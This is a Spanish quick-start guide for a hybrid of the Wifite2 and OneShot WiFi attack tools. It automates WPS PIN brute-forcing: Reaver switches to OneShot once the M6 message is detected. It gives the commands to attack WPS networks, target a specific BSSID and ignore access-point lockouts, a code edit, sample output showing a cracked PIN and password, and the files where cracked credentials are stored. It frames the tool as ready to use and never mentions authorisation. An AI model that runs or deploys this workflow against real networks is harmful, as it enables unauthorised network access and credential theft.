# GUÍA RÁPIDA - HÍBRIDO WIFITE2 + ONESHOT

## ⚡ INICIO RÁPIDO (5 PASOS)

### 1️⃣ Actualizar Python a 3.8+

#### Opción A: Windows Nativo
1. Descargar Python 3.8+ de: https://www.python.org/downloads/
2. Ejecutar instalador (marcar "Add Python to PATH")
3. Abrir nueva terminal y verificar:
   ```bash
   python --version
   # Debe mostrar: Python 3.8.x o superior
   ```

#### Opción B: WSL (Windows Subsystem for Linux)
```bash
# Instalar WSL (si no lo tienes)
wsl --install

# Dentro de WSL:
sudo apt update
sudo apt install python3.8 python3-pip aircrack-ng reaver
```

### 2️⃣ Verificar la Instalación

```bash
cd "D:\Development\hibrido hack"
python verify_hybrid.py
```

**Salida esperada:**
```
[OK] TODAS LAS VERIFICACIONES PASARON
```

### 3️⃣ Ejecutar Wifite Híbrido

```bash
cd wifite2

# Linux/WSL:
sudo python3 wifite.py

# Windows (Git Bash/MINGW64 como admin):
python wifite.py
```

### 4️⃣ Ver el Híbrido en Acción

El híbrido se activa **automáticamente** cuando detecta M6:

```
[+] WPS PIN Attack (Reaver)
    [00:02:34] (15.32%) First4:1234 Attempts:1532
    [!] ✓ M6 detected! First 4 digits: 1234
    [!] Stopping Reaver, switching to OneShot...

[+] WPS PIN Attack (OneShot)
    [00:00:01] Starting bruteforce with first 4 digits: 1234
    [00:00:45] OneShot bruteforce in progress...
    [+] OneShot Success! PIN: 12345670 PSK: MyPassword123

[+] Cracked MiWiFi_2.4G!
    PIN:  12345670
    PSK:  MyPassword123

[+] Continuing to next target...
```

### 5️⃣ ¡Listo!

Ya tienes el híbrido funcionando. Cada vez que Wifite detecte M6, automáticamente cambiará a OneShot para completar el ataque en minutos en lugar de horas.

---

## 🔧 COMANDOS ÚTILES

### Modo Verbose (ver todo)
```bash
sudo python3 wifite.py -v -vv
```

### Solo ataques WPS
```bash
sudo python3 wifite.py --wps
```

### Ignorar APs bloqueados
```bash
sudo python3 wifite.py --wps-ignore-lock
```

### Atacar un BSSID específico
```bash
sudo python3 wifite.py -b AA:BB:CC:DD:EE:FF
```

---

## ⚠️ SI ALGO NO FUNCIONA

### Error: "Invalid syntax"
→ **Python < 3.8**. Actualizar Python.

### Error: "oneshot.py not found"
→ Verificar estructura de carpetas:
```
D:\Development\hibrido hack\
├── wifite2\
└── OneShot\
    └── oneshot.py
```

### Error: "python3: command not found" (Windows)
→ Editar `wifite2/wifite/tools/reaver.py` línea ~358:
```python
# Cambiar:
oneshot_cmd = ['python3', oneshot_path, ...]
# Por:
oneshot_cmd = ['python', oneshot_path, ...]
```

### OneShot falla siempre
→ Verificar dependencias:
```bash
# Verificar wpa_supplicant
wpa_supplicant -v

# Probar OneShot manualmente
cd OneShot
sudo python oneshot.py -i wlan0 -K
```

---

## 📚 MÁS INFORMACIÓN

- **`RESUMEN_FINAL.md`** - Resumen completo del proyecto
- **`README_HYBRID.md`** - Documentación técnica detallada
- **`verify_hybrid.py`** - Script de verificación
- **`test_integration.py`** - Pruebas (requiere Python 3.8+)

---

## 🎯 LO QUE DEBES SABER

✅ **El híbrido funciona automáticamente** - no necesitas hacer nada especial

✅ **Solo se activa cuando detecta M6** - no interfiere con Pixie-Dust ni otros ataques

✅ **Reduce tiempo de 2-8 horas a 5-15 minutos** después de detectar M6

✅ **Continúa automáticamente** con la siguiente red después de éxito o fallo

✅ **Compatible con todas las opciones de Wifite** - usa Wifite normalmente

---

## 💬 NECESITAS AYUDA?

1. Ejecuta: `python verify_hybrid.py`
2. Lee el output y corrige los errores
3. Consulta `RESUMEN_FINAL.md` para más detalles
4. Revisa `README_HYBRID.md` para troubleshooting completo

---

**¡Disfruta de ataques WPS más rápidos!** 🚀

---

## 🎉 EJEMPLO COMPLETO

```bash
# 1. Actualizar Python
python --version  # Verificar que sea 3.8+

# 2. Verificar instalación
cd "D:\Development\hibrido hack"
python verify_hybrid.py

# 3. Ejecutar Wifite
cd wifite2
sudo python3 wifite.py

# 4. Seleccionar targets
# [Wifite mostrará lista de redes WPS]
# Selecciona las que quieras atacar

# 5. Ver la magia
# El híbrido trabajará automáticamente
# Cuando detecte M6 → cambiará a OneShot
# Continuará con la siguiente red automáticamente

# 6. Resultados guardados en:
# - /root/.wifite/cracked.txt
# - OneShot/reports/stored.txt
```

---

**¡ESO ES TODO! ¡HAPPY HACKING!** 🔓
